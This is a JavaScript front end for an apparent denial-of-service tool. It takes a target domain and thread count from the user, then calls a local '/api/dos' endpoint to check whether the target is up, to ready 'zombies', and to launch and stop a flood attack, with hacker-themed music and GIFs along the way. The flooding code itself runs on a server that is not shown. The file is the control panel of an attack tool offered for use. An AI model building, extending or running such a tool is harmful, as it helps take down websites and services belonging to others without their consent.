const music = new Audio('/media/song.mp3');

const domain = document.getElementById('domain');
const thread = document.getElementById('thread')
const btn = document.getElementById('btn');
const path = document.getElementById('path');
const bg = document.getElementById('bg');

const gifs = [
    'binary.gif',
    'fz.gif',
    'fz2.gif',
    'pepe.gif',
    'drugs.gif',
    'dedsec.gif',
    'hack.gif'
];

const txt = document.createElement('console');
const csl = document.getElementById('console');

const term = {
    log: function log(msg, type = 'attack') {
        if (type === 'load') {
            const load = document.createElement('a');
            const br = document.createElement('br');

            load.textContent = `${msg} `;
            load.setAttribute('class', 'load');

            txt.append(load);
            txt.append(br);
            csl.append(txt);
        };

        if (type === 'sucess') {
            const text = document.createElement('a');
            const status = document.createElement('a');
            const sep = document.createElement('a');
            const sep2 = document.createElement('a');
            const br = document.createElement('br');

            sep.textContent = "  [ ";
            status.textContent = "OK";
            sep2.textContent = " ]  ";
            text.textContent = msg;

            status.setAttribute('class', 'sucess');
            sep.setAttribute('class', 'separator');
            sep2.setAttribute('class', 'separator');

            txt.append(sep);
            txt.append(status);
            txt.append(sep2);
            txt.append(text);
            txt.append(br);
            csl.append(txt);
        };

        if (type === 'error') {
            const text = document.createElement('a');
            const status = document.createElement('a');
            const sep = document.createElement('a');
            const sep2 = document.createElement('a');
            const br = document.createElement('br');

            sep.textContent = "  [ ";
            status.textContent = "ERROR";
            sep2.textContent = " ]  ";
            text.textContent = msg;

            status.setAttribute('class', 'error');
            sep.setAttribute('class', 'separator');
            sep2.setAttribute('class', 'separator');

            txt.append(sep);
            txt.append(status);
            txt.append(sep2);
            txt.append(text);
            txt.append(br);
            csl.append(txt);
        };

        if (type === 'attack') {
            const text = document.createElement('a');
            const status = document.createElement('a');
            const sep = document.createElement('a');
            const sep2 = document.createElement('a');
            const br = document.createElement('br');

            sep.textContent = "  [ ";
            status.textContent = "ATTACK";
            sep2.textContent = " ]  ";
            text.textContent = msg;

            status.setAttribute('class', 'attack');
            sep.setAttribute('class', 'separator');
            sep2.setAttribute('class', 'separator');

            txt.append(sep);
            txt.append(status);
            txt.append(sep2);
            txt.append(text);
            txt.append(br);
            csl.append(txt);
        };
    }
};

const stopBtn = document.getElementById('btnStopText');

btn.addEventListener('click', async () => {
    if (domain.value == "") return alert('Set the Domain');
    if (thread.value == "") return alert('Set the thread');
    btn.remove();
    term.log(`Initializing to the target: ${domain.value + path.value} with ${thread.value} of thread`, 'load');
    await fetch(`/api/dos?domain=${domain.value + path.value}&option=check`)
        .then(res => res.json())
        .then(res => {
            if (res.code !== 200) {
                term.log(res.message, 'error');
                return setTimeout(() => window.location.reload(false), 1500);
            };
            term.log(`The host ${res.host} is ${res.time === 0 ? 'down' : 'up'} ${res.time === 0 ? '' : `${res.time}ms`}`, res.time === 0 ? 'error' : 'sucess');
            if (res.time === 0) return setTimeout(() => window.location.reload(false), 1000);
        });
    music.play();
    setInterval(() => {
        bg.style.backgroundImage = `url("/media/${gifs[Math.floor(Math.random() * gifs.length)]}")`;
    }, 4000);
    await term.log('Initializing zombies', 'load');
    setTimeout(() => {
        fetch(`/api/dos?domain=${domain.value + path.value}&option=viewZombies`)
            .then(res => res.json())
            .then(res => term.log(`${res.number} Zombies ready`, 'sucess'));
        setTimeout(() => {
            fetch(`/api/dos?domain=${domain.value + path.value}&option=dos&thread=${thread.value}`);
            term.log(`Attack to ${domain.value + path.value} is started watch your terminal`);
            const container = document.getElementById('btnStopTextContainer');

            container.setAttribute('class', 'btn');
            stopBtn.textContent = "Stop";
        }, 3000);
    }, 4000);
});

stopBtn.addEventListener('click', () => {
    fetch('/api/exit');
    term.log('Successfully stopped, please restart the process with: node index.js', 'sucess');
    setTimeout(() => window.location.reload(false), 2000);
});